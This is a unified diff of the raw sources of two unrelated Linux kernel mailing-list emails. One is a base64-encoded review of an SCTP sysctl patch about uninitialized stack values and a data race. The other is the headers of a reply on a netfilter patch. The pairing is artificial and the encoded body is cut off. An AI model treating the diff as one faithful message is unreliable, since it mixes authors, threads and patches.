@@ -1,76 +1,100 @@
-Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.remote-ip=209.85.160.197
-ARC-Seal: i=1; d=subspace.kernel.org; s=arc20261015; a=rsa-sha256; cv=none;
-	t=1795657420;
-	b=vanwTsUjd7WmpaqwRvRb8FBSCBIq5pVVLLP9QbUcz6gAr1YrVG/APIeG1i04QpOAdqvc
-	 ni2lRwdBmWuVjVYmfvr1VZTYYH83VFpiBUD9mb1TKuC6ksOJY8gNpAU1QxxCeEfIQOftg
-	 SpWHmQtlR7uvz/Leh3pXkqwcHx2wOZQ1O45DJi1DyIH9VbJc51pbKFLUhyRYzuAu8gKYp
-	 JUhf92CJo1zqc13M8Rkn/6K3B5ZlcuxKCHvWHVpYWogvyHjTFMhx/QWDGI+mWqW6PFjcR
-	 iFrYkrqL0p4AO9oNbbzue/ofCRtMkbittBs5HqnKOoEZupLt1kgvYYqKSAFij2r1eZQ==
-ARC-Message-Signature: i=1; d=subspace.kernel.org; s=arc20261015;
-	a=rsa-sha256; c=relaxed/relaxed; t=1795657420;
+Authentication-Results: smtp.subspace.kernel.org; arc=fail smtp.remote-ip=209.85.210.174
+ARC-Seal: i=2; d=subspace.kernel.org; s=arc20261015; a=rsa-sha256; cv=fail;
+	t=1795657429;
+	b=FQrYZ8r1L8b29k0irSiqNQfSsPk4COrme6n9Gg7avWu6DmUYasODA8S+U0S5RtK5iIpt
+	 kwq0lTA+XyEbI5ZuGIU0a2nkDPPJWLQZEpzzAnpyaEtdw/jkOitNeZdhwjKwipNkdwKLZ
+	 WB3acaVI745zpSWKGqkHfD4FSFT3qZWF9RZ9e44RuRjmC3a99CBufgs/xNdnUuBXuSAFu
+	 XAe+VZkhiULksc/FVb/o4MdHsFnsKwTh2qc5TICS70JGwvIZWhO6DzzdUI+WyUFvOyw0i
+	 C4rYwAibSN0G2zAMg4xC5Lb0YoF8WzOT+Y4c7J7ZgF79zYeYVOvMmcov84OEhFcaK2A==
+ARC-Message-Signature: i=2; d=subspace.kernel.org; s=arc20261015;
+	a=rsa-sha256; c=relaxed/relaxed; t=1795657429;
 	h=DMARC-Filter:Received:DKIM-Signature:X-Google-DKIM-Signature:
-	 X-Forwarded-Encrypted:X-Gm-Message-State:X-Received:Date:In-Reply-To:
-	 Mime-Version:References:Message-ID:Subject:From:To:Cc:Content-Type:
-	 Content-Transfer-Encoding;
-	bh=nrXuPUM5yfpDgDX0n3J5QvzILiwiCgqvsXlEhc2+DWI=;
-	b=WnACHOVTCjJOonf6UVQLvzazGIVJIsZOAh3b8cW0J0yr0HDD5BrIuKfIf6sSkTQ8Ed7b
-	 /eh407BWoCZ1G+gnsR38RtveBVvsoBUIJFP40ZupMaBsE2/m2hLAy5qeaLIWwUrU1ivVm
-	 KmLzoNqAOjlPz5SKUDxbwXZGnJ0jruwkPHr2kvdRjLtObBJDVxlBW54X3u2T7+Zw/WA30
-	 GkVoSJtNA/7nqw4SUimuTFnJEyEeawNtqicOZsaB7Ov2f3ohsFdg8uzYjQNtuoEKFrVN4
-	 6xHSwy5dTY2JPdRXp0fNpZME3NXz7yYpoKj7YYxcWssOCdXW18PPoY9gpcurwxSyLPg==
-ARC-Authentication-Results: i=1; smtp.subspace.kernel.org; 
-	dmarc=pass header.from=google.com;
-	spf=pass smtp.mailfrom=flex--willemb.bounces.google.com;
-	dkim=pass header.d=google.com header.i=@google.com header.a=rsa-sha256 header.s=20260707 header.b=nPJ4BkLy;
-	arc=none smtp.remote-ip=209.85.160.197
-Received: from mail-qt1-f197.google.com (mail-qt1-f197.google.com [209.85.160.197])
+	 X-Forwarded-Encrypted:X-Gm-Message-State:X-Gm-Gg:X-Received:
+	 MIME-Version:References:In-Reply-To:From:Date:X-Gm-Features:
+	 Message-ID:Subject:To:Cc:Content-Type:Content-Transfer-Encoding;
+	bh=p2OMwSAupKVnOVH1s6/p9acTAXNTJP7ZElVm7AVIKZU=;
+	b=AcNOtPQNwZtN5aFgRmxUx/hJM1l5HvKLKs1hUk/Y/yjiq1RLbxVuBnegByYOwIBjN+hR
+	 A45WCrpqPT0fptU5D1IF98kDjNRGsAoBREBamh8hi+XfHnJ+rbWNpa4OpKqXaCfBTKpVA
+	 drIJ7mssmxT0rs1ojTTQAb4nQVAgx1rZnBQzpRAgoXSSz6mKqM++OOakwllrlqS6PIsma
+	 WP0g233jWwMp6bHheVXaazF2w+esHb5V/xFZD3qb7qIuuuoiFX5uYkRW9vZJcIiyyRAUr
+	 /TlUwJgL3q3JojRP/XERRN6G6vCcNpdruB0Rn+C7Db+yqnN7dkiyzas9toU+ouv6uxA==
+ARC-Authentication-Results: i=2; smtp.subspace.kernel.org; 
+	dmarc=pass header.from=asu.edu;
+	spf=pass smtp.mailfrom=asu.edu;
+	dkim=pass header.d=asu.edu header.i=@asu.edu header.a=rsa-sha256 header.s=google header.b=GKbIwy7E;
+	arc=fail smtp.remote-ip=209.85.210.174
+Received: from mail-pf1-f174.google.com (mail-pf1-f174.google.com [209.85.210.174])
 	(using TLSv1.3 with cipher TLS_AES_128_GCM_SHA256 (128/128 bits)
 	 key-exchange X25519 server-signature ECDSA (prime256v1) server-digest SHA256)
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 6577D606A68B
-	for <linux-kernel@vger.kernel.org>; Thu, 26 Nov 2026 01:43:39 +0000 (UTC)
-DMARC-Filter: OpenDMARC Filter v1.4.2 smtp.subspace.kernel.org 6577D606A68B
-Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=reject dis=none) header.from=google.com
-Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=flex--willemb.bounces.google.com
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 4954C606A32D
+	for <linux-kernel@vger.kernel.org>; Thu, 26 Nov 2026 01:43:48 +0000 (UTC)
+DMARC-Filter: OpenDMARC Filter v1.4.2 smtp.subspace.kernel.org 4954C606A32D
+Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=asu.edu
+Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=asu.edu
 Authentication-Results: smtp.subspace.kernel.org;
-	dkim=pass (2048-bit key) header.d=google.com header.i=@google.com header.a=rsa-sha256 header.s=20260707 header.b=nPJ4BkLy
-Received: by mail-qt1-f197.google.com with SMTP id d75a77b69052e-55d33f412b1so120167211cf.3
-        for <linux-kernel@vger.kernel.org>; Wed, 25 Nov 2026 17:43:39 -0800 (PST)
+	dkim=pass (2048-bit key) header.d=asu.edu header.i=@asu.edu header.a=rsa-sha256 header.s=google header.b=GKbIwy7E
+Received: by mail-pf1-f174.google.com with SMTP id d2e1a72fcca58-8b612fd74e1so2271931b3a.0
+        for <linux-kernel@vger.kernel.org>; Wed, 25 Nov 2026 17:43:48 -0800 (PST)
+ARC-Seal: i=1; a=rsa-sha256; t=1795657428; cv=none;
+        d=google.com; s=arc-20260327;
+        b=VXfwbvXh9aK/1MO/e2hZ/07ZtctJhcrBP+1oyI7jfqC7qEr/MyCTOyaZ56bWdi/Z02
+         z6jUSCjH16IAUifGzPzBLJ4EWkkWcEGBxHNcfLK70YSy5c/eMCzAt1Svjim1QfChkz2F
+         1Z0q+oiW3HW11zKlRZieb1E83mRelr9REryaj8utTQmJ8b9a2Jfa1Qw1M4xcl1zK7CrN
+         l638pYA6Nwaldej5Xpl5EAuC7uL14JsEOkjuxBusNdsJg+5TmT72WCrlqwx/xPtFx/Lh
+         EnXyBWTE7w7cVHgamghFYTN7Kkzh/tBIGV6vopmJyO8lIUvgd0oTOTc+AgiWncDOZmhk
+         A96w==
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=google.com; s=arc-20260327;
+        h=content-transfer-encoding:cc:to:subject:message-id:date:from
+         :in-reply-to:references:mime-version:dkim-signature;
+        bh=p2OMwSAupKVnOVH1s6/p9acTAXNTJP7ZElVm7AVIKZU=;
+        fh=jxQWpq3R4GzLwESDaySZqADJmJDvd9jFYfH7qay3LDY=;
+        b=PoSQ9XJ4C/RKd04vYLc8vF/DYVfF8Qejp6cgVeIJQTdlrHNly7EcypJgFlYlk72i7A
+         FDT9e4YJgxtQomJytN9XVPS5Z3xpWqZtrPysXzEFGWcSxNpQisn5KudPSTdP8lcG6lBk
+         CkY6KwA+pwTv+TlldyEtepMXZZkNADj90avqpTYAIcaJ5OZVkpYz70N6zsNwr+ViGp76
+         GIHVpsf69vUPAkM23XoEOlVN612tuM2T4WPvEJQWbz9v+cT7vd9Vay0tP46F8SHNNVdw
+         nqK26PBo8nGbRXujXheICN8OCMGWEJ/2pf9xcdDnUTfZ/Taya4Zsa6CO1K75gsyWKu9P
+         exdQ==;
+        darn=vger.kernel.org
+ARC-Authentication-Results: i=1; mx.google.com; arc=none
 DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=google.com; s=20260707; t=1795657418; x=1796262218; darn=vger.kernel.org;
-        h=content-transfer-encoding:content-type:cc:to:from:subject
-         :message-id:references:mime-version:in-reply-to:date:from:to:cc
-         :subject:date:message-id:reply-to:content-type;
-        bh=nrXuPUM5yfpDgDX0n3J5QvzILiwiCgqvsXlEhc2+DWI=;
-        b=nPJ4BkLyyEzyHU+bvZrBWvxRPpX0bgoecvClAWGVv7l4C610ZTnamBOFIOLNcnUxJj
-         N0O4APgoOzibfpuYbvwP1fwNWb/4nAeXHlod97kxJx+7OUFbVJCFrc4eSaREXNAkixa+
-         2HQWKHbhDB2ED4K1mn0q3e5RN24Kr6FtMSMN3BzkgHf6Vcnp8J0KdiKzG7JZ0za9h7XG
-         3ELjhZNZKD8bEU14MZv4B89lO5041uLiK59dQHzhVwPGYmQmdTZD2SnGn6MC8sZ3K0Sd
-         mfu4yyMaGKMvfv61rxPlL703uB3XrlHzU0ejdf5Jc6jxMunvoFKR5P2Fh8419ydAdGd3
-         wKTQ==
+        d=asu.edu; s=google; t=1795657428; x=1796262228; darn=vger.kernel.org;
+        h=content-transfer-encoding:content-type:cc:to:subject:message-id
+         :date:from:in-reply-to:references:mime-version:from:to:cc:subject
+         :date:message-id:reply-to:content-type;
+        bh=p2OMwSAupKVnOVH1s6/p9acTAXNTJP7ZElVm7AVIKZU=;
+        b=GKbIwy7EsfppXcPV/Et1dgSiczDWZ18cslST1VQRE6opOPFRCiXz2yQEKcJb4MnFyw
+         ZLyFvuE6YxUGXffAtu8CDdybOhZWglOBNwYV2wBtXwMk73vK9jWo8LUH1T6+y/NZCoCZ
+         LiNBgzjibNol5naqalW7d3IegMrJWPaVP/DKetilWUDVqoc53XNz0Hh9Rv+jDlt2eaYa
+         +rnV+lCncOoD0HuM5UqxZg5pxWJno5BPn82NvToZBIxs58Lf1biJ81M1yZhCOZGPRmwU
+         fMAqXZeB85RR1akExnkWaP5mY1Ry/PhayaIPakNwPAQUUeCuekztekYNqhXvLtdU8d5A
+         3aTQ==
 X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20260707; t=1795657418; x=1796262218;
-        h=content-transfer-encoding:content-type:cc:to:from:subject
-         :message-id:references:mime-version:in-reply-to:date
+        d=1e100.net; s=20260707; t=1795657428; x=1796262228;
+        h=content-transfer-encoding:content-type:cc:to:subject:message-id
+         :date:from:in-reply-to:references:mime-version:x-gm-gg
          :x-gm-message-state:from:to:cc:subject:date:message-id:reply-to
          :content-type;
-        bh=nrXuPUM5yfpDgDX0n3J5QvzILiwiCgqvsXlEhc2+DWI=;
-        b=eI1HmcxVdmbGOPQP0YrzsxaMFNw5OdU+W6ofNAfrKDkJEVCwVfjm6z8/BKyIkl5ZZ8
-         wEXR3Xi94vzFBIoIlmrX8K68oMf+qGW5kWIm5U6snbiHMDQGs1ogwqA8wjnWKblj0hIH
-         VMod02UYE0a8x6eGeBgUEYDE4xgbjP3h/GWFGq9atjPuI3xmZHlYvrpE/Iw0icR/+8G5
-         93ilPy9S+7JsYvZ92eQfIVPITMPko5q8G8IBNu11m/Flp8mmjxYQBQPLPthIk4G9Huh5
-         9vv/jq1Alcr23//Xh4vWEZ0Suho7Kb+G3roh3IwF31a/KMRgpFSuddP/bqsJq25swdvN
-         qqww==
-X-Forwarded-Encrypted: i=1; AL+hErHwwlxJ37/uDlXGzuKOm1CSzlYlFdnO8wuaP3kCFyuEjM5TC73uYOu7fGALshIHa1d8d6XY1szCb/Y3gJ0=@vger.kernel.org
-X-Gm-Message-State: APuU4Z+7vh8rF8Mq0WL9BLVwpH6sY6mHgHg50dU8EGpjdI3l65v8gvbS
-	DSZfZl9mwj6SQNwPLlrJZzFVC/VzvIfbtb3wPthia6J5xo2Op3r3fpSI8/8HR3sXDM1nzjM9eTo
-	0XoCMpUHgOA==
-X-Received: from qtja6.prod.google.com ([2002:ac8:1086:0:b0:536:7688:b0ad])
- (user=willemb job=prod-delivery.src-stubby-dispatcher) by 2002:a05:622a:1646:b0:536:5bb2:545d
- with SMTP id d75a77b69052e-55d76a5c656mr354322081cf.56.1795657418015; Wed, 25
- Nov 2026 17:43:38 -0800 (PST)
-Date: Wed, 25 Nov 2026 20:43:37 -0500
-In-Reply-To: <CADvbK_fM=xmwthLnz=j7YqRghc6ncDo8ESVYgWYeR0t_Byubhg@mail.gmail.com>
+        bh=p2OMwSAupKVnOVH1s6/p9acTAXNTJP7ZElVm7AVIKZU=;
+        b=YAgblbGS6GrLFqhjaJGI8grDfpTOmra6LE6ar9f8Qovadnbv7/BzK21/oAHbOgAOta
+         +D2eXUId+KT06p5f9IMO/OXh+8vwlK+M87kmc3V+i42OV9fdXWboqrkGsrSDiRKGFpiU
+         mSVeOijys/bNJXUn6V3qSqa5FvLkor2Eg5pjV+UqcdCLQir40aT4lqG5Y8so55aBNq+P
+         d8kzSkJzbTy7ajkj7cYMHwE1HQFOxNKnKQu4qv+qC4kuwq/NjYtnhzGWEw60p4flmrxu
+         m0uzJnm3Sz/cHHReTAfTgnJ0JA6EtbxPzL+L/5Pbx+6jRNWzuD8hhX4YwsnC7HsAXgyx
+         ES+g==
+X-Forwarded-Encrypted: i=1; AL+hErGtJkgKBTjNlZhcDwBvhVJrArVuZSPC3f1tT7iUZ6XRBgMyb/mw0L23m8mdCpFsz4Voh5b0nHK96C2PaYg=@vger.kernel.org
+X-Gm-Message-State: APuU4Z/1c+uFeAnI/o+h3c+drkg8YaeQ0JZJWjhGVL4S7Vxv410Qh8oQ
+	35qzd1n66H1g09DdzJX5ZeRpWfVSNOeKbOgN3Nj+Mw7WIpAXMwcPIhOFyz9YF04wgq8E5axkYh7
+	vg3q6DxQoJKsiXbHTKLnSDXIN5OkY4j/6oSGAvZcS
+X-Gm-Gg: AZFdTZdT2l/NS3TRt0RyG3TVJCQSXkbdJ6LM6dwN9lMAvwr5Bs7QfcxWHJGpKGxdIXx
+	LkSfAmCxMD+6orXtvm3cuy0CaQIpF09bK0LWKf6C9OyMzhleaieVh6w6k0eTSMQTlShNR0h7SFN
+	YubjfF2ofdWvSYETdzNCHT/KdsUKA6h0OTKRNlScDYzhE1fMtkF2EaOxn2md+58jI+DjvYuZ33M
+	wdAohrpiGYI+BofNieS/RRtnmmV3W1W9/uoqQ44G4Tpi6DiBYR3Er4lPCLu6S8WNkFvs0nFor0A
+	uj54Gc37oNes767fAyfSTWshpR6IA612QEsqEjEnxeUDBAMMfDJpfKgaxxJvWB49m8nnMzREGOX
+	lsMgmawD44NF5dxZyC9C3VEoGZhyBQogFnNDqEY5V5arw2E3YVbTdv3dHBcBZg4LVb8eM
+X-Received: by 2002:a05:6a21:6812:b0:3e2:8c31:21cf with SMTP id
+ adf61e73a8af0-4014de5bd25mr18196958637.76.1795657427468; Wed, 25 Nov 2026
+ 17:43:47 -0800 (PST)
 X-Mailing-List: linux-kernel@vger.kernel.org
 List-Id: <linux-kernel.vger.kernel.org>
 List-Post: <mailto:linux-kernel@vger.kernel.org>
@@ -79,192 +103,540 @@ List-Subscribe: <mailto:linux-kernel+subscribe@vger.kernel.org>
 List-Unsubscribe: <mailto:linux-kernel+unsubscribe@vger.kernel.org>
 List-Owner: <mailto:linux-kernel+owner@vger.kernel.org>
 Precedence: list
-Mime-Version: 1.0
-References: <20261119170342.1508789-1-irogers@google.com> <CADvbK_fM=xmwthLnz=j7YqRghc6ncDo8ESVYgWYeR0t_Byubhg@mail.gmail.com>
-Message-ID: <willemb.10dbd5ae83053@google.com>
-Subject: Re: [PATCH net] sctp: initialize new_value in custom proc_dointvec
- sysctl handlers
-From: willemb@google.com
-To: Xin Long <lucien.xin@gmail.com>, Ian Rogers <irogers@google.com>
-Cc: Marcelo Ricardo Leitner <marcelo.leitner@gmail.com>, "David S. Miller" <davem@davemloft.net>, 
+MIME-Version: 1.0
+References: <20261126001151.13793-1-xmei5@asu.edu> <awd9f47inahmDWRP@chamomile>
+ <awd_r2mOR7xuYzh4@chamomile>
+In-Reply-To: <awd_r2mOR7xuYzh4@chamomile>
+From: Xiang Mei <xmei5@asu.edu>
+Date: Wed, 25 Nov 2026 18:43:35 -0700
+X-Gm-Features: Aa3M54racRdDiyseUzP7YgMzwacaYGswv7XwTiacCaigXQhxDeGIF2fGevwvleI
+Message-ID: <CAPpSM+TTd7sQvAjDS_u69xLNwtPgFrr23dxi8yKgRPfqosfjUQ@mail.gmail.com>
+Subject: Re: [PATCH nf] netfilter: nft_exthdr: pull the IPv6 header before ipv6_find_hdr()
+To: Pablo Neira Ayuso <pablo@netfilter.org>
+Cc: Florian Westphal <fw@strlen.de>, Phil Sutter <phil@nwl.cc>, "David S. Miller" <davem@davemloft.net>, 
 	Eric Dumazet <edumazet@kernel.org>, Jakub Kicinski <kuba@kernel.org>, Paolo Abeni <pabeni@redhat.com>, 
-	Simon Horman <horms@kernel.org>, linux-sctp@vger.kernel.org, netdev@vger.kernel.org, 
-	linux-kernel@vger.kernel.org, llvm@lists.linux.dev, 
-	Elkin Cruz <elkin@google.com>
-Content-Type: text/plain; charset="UTF-8"; format=flowed; delsp=yes
-Content-Transfer-Encoding: base64
+	Willem de Bruijn <willemb@google.com>, Simon Horman <horms@kernel.org>, netfilter-devel@vger.kernel.org, 
+	coreteam@netfilter.org, netdev@vger.kernel.org, linux-kernel@vger.kernel.org, 
+	stable@vger.kernel.org, co+85229ab197510ca7@bugs.sh
+Content-Type: text/plain; charset="UTF-8"
+Content-Transfer-Encoding: quoted-printable
 
-WGluIExvbmcgd3JvdGU6DQo+IE9uIFRodSwgTm92IDE5LCAyMDI2IGF0IDEyOjAz4oCvUE0gSWFu
-IFJvZ2VycyA8aXJvZ2Vyc0Bnb29nbGUuY29tPiB3cm90ZToNCj4gPg0KPiA+IHByb2Nfc2N0cF9k
-b19ydG9fbWluKCksIHByb2Nfc2N0cF9kb19ydG9fbWF4KCksIHByb2Nfc2N0cF9kb19hdXRoKCks
-DQo+ID4gcHJvY19zY3RwX2RvX3VkcF9wb3J0KCksIGFuZCBwcm9jX3NjdHBfZG9fcHJvYmVfaW50
-ZXJ2YWwoKSBwb2ludA0KPiA+IHRibC5kYXRhIGF0IGFuIHVuaW5pdGlhbGl6ZWQgc3RhY2sgdmFy
-aWFibGUgbmV3X3ZhbHVlIG9uIHdyaXRlcyBiZWZvcmUNCj4gPiBjYWxsaW5nIHByb2NfZG9pbnR2
-ZWMoKS4NCj4gPg0KPiA+IHByb2NfZG9pbnR2ZWMoKSBjYW4gcmV0dXJuIDAgd2l0aG91dCB3cml0
-aW5nIHRvIHRibC5kYXRhLCBmb3IgZXhhbXBsZSBvbg0KPiA+IGEgemVyby1sZW5ndGggd3JpdGUg
-KCpsZW5wID09IDApIG9yIG9uIGEgd3JpdGUgYXQgYSBub24temVybyBmaWxlIG9mZnNldA0KPiA+
-IGlnbm9yZWQgYnkgcHJvY19maXJzdF9wb3Nfbm9uX3plcm9faWdub3JlKCkgKHN1Y2ggYXMgcHdy
-aXRlKGZkLCAiMVxuIiwNCj4gPiAyLCAxKSBvciBhIHNwbGl0IHdyaXRlIHdoZXJlIHRoZSB0cmFp
-bGluZyBuZXdsaW5lIGlzIHdyaXR0ZW4gIA0KPiBzZXBhcmF0ZWx5KS4NCj4gPg0KPiA+IFdoZW4g
-dGhhdCBoYXBwZW5zOg0KPiA+IC0gcHJvY19zY3RwX2RvX2F1dGgoKSB1bmNvbmRpdGlvbmFsbHkg
-c3RvcmVzIHRoZSB1bmluaXRpYWxpemVkIHN0YWNrIGludA0KPiA+ICAgaW50byBuZXQtPnNjdHAu
-YXV0aF9lbmFibGUgYW5kIHNjdHBfc2soc2spLT5lcC0+YXV0aF9lbmFibGUsIGJvdGgNCj4gPiAg
-IGNvcnJ1cHRpbmcgU0NUUCBhdXRoZW50aWNhdGlvbiBzdGF0ZSBhbmQgbGVha2luZyA0IGJ5dGVz
-IG9mIGtlcm5lbA0KPiA+ICAgc3RhY2sgbWVtb3J5IGJhY2sgb24gc3Vic2VxdWVudCBzeXNjdGwg
-cmVhZHMuDQo+ID4gLSBwcm9jX3NjdHBfZG9fcnRvX21pbigpLCBwcm9jX3NjdHBfZG9fcnRvX21h
-eCgpLA0KPiA+ICAgcHJvY19zY3RwX2RvX3VkcF9wb3J0KCksIGFuZCBwcm9jX3NjdHBfZG9fcHJv
-YmVfaW50ZXJ2YWwoKSB2YWxpZGF0ZQ0KPiA+ICAgdGhlIHVuaW5pdGlhbGl6ZWQgdmFsdWUgYW5k
-IG92ZXJ3cml0ZSB0aGUgbmV0bnMgc2V0dGluZyB3aGVuZXZlciBzdGFjaw0KPiA+ICAgYnl0ZXMg
-aGFwcGVuIHRvIGZhbGwgd2l0aGluIHJhbmdlLg0KPiA+IC0gcHJvY19zY3RwX2RvX3VkcF9wb3J0
-KCkgYWxzbyBzdG9wcyBhbmQgcmVzdGFydHMgdGhlIFVEUCBlbmNhcHN1bGF0aW9uDQo+ID4gICBz
-b2NrZXQgZXZlbiB3aGVuIHRoZSBwb3J0IG51bWJlciBkaWQgbm90IGNoYW5nZS4NCj4gPg0KPiA+
-IEluaXRpYWxpemUgbmV3X3ZhbHVlIHRvIHRoZSBjdXJyZW50IG5ldG5zIHNldHRpbmcgYmVmb3Jl
-IGNhbGxpbmcNCj4gPiBwcm9jX2RvaW50dmVjKCkgKG1hdGNoaW5nIHByb2NfZG9ib29sKCkpLCBh
-bmQgc2tpcCB0ZWFyaW5nIGRvd24gYW5kDQo+ID4gcmVzdGFydGluZyB0aGUgVURQIGVuY2Fwc3Vs
-YXRpb24gc29ja2V0IGluIHByb2Nfc2N0cF9kb191ZHBfcG9ydCgpIHdoZW4NCj4gPiBuZXdfdmFs
-dWUgZXF1YWxzIG5ldC0+c2N0cC51ZHBfcG9ydC4NCj4gPg0KPiA+IEZvdW5kIGJ5IGVuYWJsaW5n
-IENsYW5nJ3MgLVdjb25kaXRpb25hbC11bmluaXRpYWxpemVkIG9uIGFuIHg4Nl82NA0KPiA+IGFs
-bHllc2NvbmZpZyBidWlsZCwgd2l0aCBBSSBjb2RpbmcgYXNzaXN0YW50IGhlbHAgdG8gYXVkaXQg
-dGhlIHdhcm5pbmcNCj4gPiBhbmQgcHJlcGFyZSB0aGUgZml4LiBCdWlsZC10ZXN0ZWQgd2l0aCBD
-bGFuZzsgbm90IHJ1bnRpbWUtdGVzdGVkLg0KPiA+DQo+ID4gRml4ZXM6IDRmM2ZkZjNiYzU5YyAo
-InNjdHA6IGFkZCBjaGVjayBydG9fbWluIGFuZCBydG9fbWF4IGluIHN5c2N0bCIpDQo+ID4gRml4
-ZXM6IGIxNDg3OGNjYjdmYSAoIm5ldDogc2N0cDogY2FjaGUgYXV0aF9lbmFibGUgcGVyIGVuZHBv
-aW50IikNCj4gPiBGaXhlczogMDQ2YzA1MmI0NzVlICgic2N0cDogZW5hYmxlIHVkcCB0dW5uZWxp
-bmcgc29ja3MiKQ0KPiA+IEZpeGVzOiBkMWU0NjJhN2E1ZjMgKCJzY3RwOiBhZGQgcHJvYmVfaW50
-ZXJ2YWwgaW4gc3lzY3RsIGFuZCAgDQo+IHNvY2svYXNvYy90cmFuc3BvcnQiKQ0KPiA+IFNpZ25l
-ZC1vZmYtYnk6IElhbiBSb2dlcnMgPGlyb2dlcnNAZ29vZ2xlLmNvbT4NCj4gPiAtLS0NCj4gPiAg
-bmV0L3NjdHAvc3lzY3RsLmMgfCAzOSArKysrKysrKysrKysrKysrKysrKysrKy0tLS0tLS0tLS0t
-LS0tLS0NCj4gPiAgMSBmaWxlIGNoYW5nZWQsIDIzIGluc2VydGlvbnMoKyksIDE2IGRlbGV0aW9u
-cygtKQ0KPiA+DQo+ID4gZGlmZiAtLWdpdCBhL25ldC9zY3RwL3N5c2N0bC5jIGIvbmV0L3NjdHAv
-c3lzY3RsLmMNCj4gPiBpbmRleCAyYjk0YzIxMTQyN2QuLjBjMzNmMDVmYTUzMiAxMDA2NDQNCj4g
-PiAtLS0gYS9uZXQvc2N0cC9zeXNjdGwuYw0KPiA+ICsrKyBiL25ldC9zY3RwL3N5c2N0bC5jDQo+
-ID4gQEAgLTQyNSw4ICs0MjUsOSBAQCBzdGF0aWMgaW50IHByb2Nfc2N0cF9kb19ydG9fbWluKGNv
-bnN0IHN0cnVjdCAgDQo+IGN0bF90YWJsZSAqY3RsLCBpbnQgd3JpdGUsDQo+ID4gICAgICAgICBz
-dHJ1Y3QgbmV0ICpuZXQgPSBjb250YWluZXJfb2YoY3RsLT5kYXRhLCBzdHJ1Y3QgbmV0LCAgDQo+
-IHNjdHAucnRvX21pbik7DQo+ID4gICAgICAgICB1bnNpZ25lZCBpbnQgbWluID0gKih1bnNpZ25l
-ZCBpbnQgKikgY3RsLT5leHRyYTE7DQo+ID4gICAgICAgICB1bnNpZ25lZCBpbnQgbWF4ID0gKih1
-bnNpZ25lZCBpbnQgKikgY3RsLT5leHRyYTI7DQo+ID4gKyAgICAgICBpbnQgbmV3X3ZhbHVlID0g
-bmV0LT5zY3RwLnJ0b19taW47DQo+ID4gICAgICAgICBzdHJ1Y3QgY3RsX3RhYmxlIHRibDsNCj4g
-PiAtICAgICAgIGludCByZXQsIG5ld192YWx1ZTsNCj4gPiArICAgICAgIGludCByZXQ7DQoNCiAg
-ICAgSW5pdGlhbGl6aW5nIG5ld192YWx1ZSB3aXRoIGEgcGxhaW4gdW5sb2NrZWQgbG9hZCBoZXJl
-IChhbmQgaW4NCiAgICAgcHJvY19zY3RwX2RvX3J0b19tYXgoKSwgcHJvY19zY3RwX2RvX2F1dGgo
-KSwgYW5kICANCnByb2Nfc2N0cF9kb19wcm9iZV9pbnRlcnZhbCgpKQ0KICAgICBkb2VzIG5vdCBh
-Y3R1YWxseSBtYXRjaCBwcm9jX2RvYm9vbCgpLCB3aGljaCB1c2VzIFJFQURfT05DRSgpIC8gIA0K
-V1JJVEVfT05DRSgpLA0KICAgICBhbmQgaW50cm9kdWNlcyBhIG5ldyB1bm1hcmtlZC1yZWFkIHZz
-LiB1bm1hcmtlZC13cml0ZSBkYXRhIHJhY2UgYWdhaW5zdA0KICAgICBjb25jdXJyZW50IHdyaXRl
-cnMgKGV2ZW4gb24gcmVhZC1vbmx5ICF3cml0ZSBjYWxscyB3aGVyZSBuZXdfdmFsdWUgaXMgIA0K
-dW51c2VkKS4NCg0KICAgICBJbiBhZGRpdGlvbiwgb24gYW4gaWdub3JlZCB3cml0ZSAoKmxlbnAg
-PT0gMCBvciAqcHBvcyA+IDApLCB0aGVzZSBmb3VyDQogICAgIGhhbmRsZXJzIHN0aWxsIGV4ZWN1
-dGUgdGhlIHBvc3QtcHJvY19kb2ludHZlYygpIGNvbW1pdCBibG9jayAgDQp1bmNvbmRpdGlvbmFs
-bHk6DQogICAgIGlmIGFub3RoZXIgd3JpdGVyIHVwZGF0ZXMgdGhlIHNldHRpbmcgYmV0d2VlbiB0
-aGUgaW5pdGlhbCBsb2FkIGFuZCB0aGUgIA0Kc3RvcmUsDQogICAgIHRoZSBuby1vcCB3cml0ZSBv
-dmVyd3JpdGVzIGl0IHdpdGggdGhlIHN0YWxlIHByZS1jYWxsIHZhbHVlIChhbmQgaW4NCiAgICAg
-cHJvY19zY3RwX2RvX2F1dGgoKSwgbmVlZGxlc3NseSBhY3F1aXJlcyBsb2NrX3NvY2sobmV0LT5z
-Y3RwLmN0bF9zb2NrKSAgDQphbmQNCiAgICAgcmV2ZXJ0cyBlcC0+YXV0aF9lbmFibGUgYXMgd2Vs
-bCkuDQoNCiAgICAgUmV0dXJuaW5nIGVhcmx5IG9uIHJlYWRzIChgaWYgKCF3cml0ZSkgcmV0dXJu
-IHByb2NfZG9pbnR2ZWMoY3RsLCB3cml0ZSwNCiAgICAgYnVmZmVyLCBsZW5wLCBwcG9zKTtgKSwg
-aW5pdGlhbGl6aW5nIGBvbGRfdmFsdWUgPSBSRUFEX09OQ0UoLi4uKWAgLw0KICAgICBgbmV3X3Zh
-bHVlID0gb2xkX3ZhbHVlYCB1bmNvbmRpdGlvbmFsbHkgb24gdGhlIHdyaXRlIHBhdGggKGtlZXBp
-bmcgIA0KQ2xhbmcncw0KICAgICAtV2NvbmRpdGlvbmFsLXVuaW5pdGlhbGl6ZWQgaGFwcHkpLCBh
-bmQgZ2F0aW5nIHRoZSBjb21taXQgYmxvY2sgb24NCiAgICAgYG5ld192YWx1ZSAhPSBvbGRfdmFs
-dWVgIHdpdGggV1JJVEVfT05DRSgpIGF2b2lkcyBib3RoIHRoZSBkYXRhIHJhY2UgYW5kDQogICAg
-IHN0YWxlIHdyaXRlYmFja3Mgb24gaWdub3JlZCB3cml0ZXMuDQo+ID4NCj4gPiAgICAgICAgIG1l
-bXNldCgmdGJsLCAwLCBzaXplb2Yoc3RydWN0IGN0bF90YWJsZSkpOw0KPiA+ICAgICAgICAgdGJs
